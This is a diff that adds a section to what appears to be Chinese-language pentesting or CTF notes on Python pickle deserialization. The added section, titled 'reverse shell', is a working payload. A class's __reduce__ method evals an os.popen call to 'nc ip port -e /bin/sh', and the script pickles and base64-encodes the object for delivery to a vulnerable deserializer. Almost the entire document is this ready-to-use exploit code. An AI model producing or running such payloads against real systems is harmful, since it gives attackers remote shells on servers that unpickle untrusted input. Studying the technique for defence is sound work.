@@ -171,6 +171,19 @@ print(a_quoted)
 # 将生成的序列化串，传入反序列化进行RCE文件读取。
 ```
 
+反弹shell
+```
+import pickle
+import base64
+
+class rce():
+    def __reduce__(self):
+        return (eval,("__import__('os').popen('nc ip port -e /bin/sh').read()"))
+    
+c=rce()
+c=pickle.dumps(c)
+print(base64.b64encode(c))
+```
 
 
 
